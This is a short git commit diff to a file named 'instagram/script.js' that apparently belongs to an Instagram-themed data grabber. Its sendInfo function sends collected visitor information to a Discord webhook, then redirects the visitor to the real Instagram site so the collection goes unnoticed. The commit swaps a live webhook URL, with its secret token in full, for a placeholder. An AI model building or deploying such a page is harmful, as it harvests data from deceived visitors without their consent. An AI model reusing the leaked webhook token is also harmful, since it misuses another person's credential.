cb012851ddd6e8607184e8effdfd529e25b29e39
むぎ <genki.mugi@gmail.com>
2025-10-02 21:08:34 +0900

    Update script.js

--- instagram/script.js
+++ instagram/script.js
@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discordapp.com/api/webhooks/1423279153456615448/ELODBW6d3TPxnzR5q4hczZF2b5w0CLMu1hCTdtbQ8jfLC59MLJq16oVRfZBIj5KF0oLL"; //your discord webhook url
+  const webhook = "YOUR_DISCORD_WEBHOOK"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
@@ -88,6 +88,7 @@ async function sendInfo() {
     window.location.replace("https://www.instagram.com/explore/")
   }, 1000);
 }
+
 
 
 
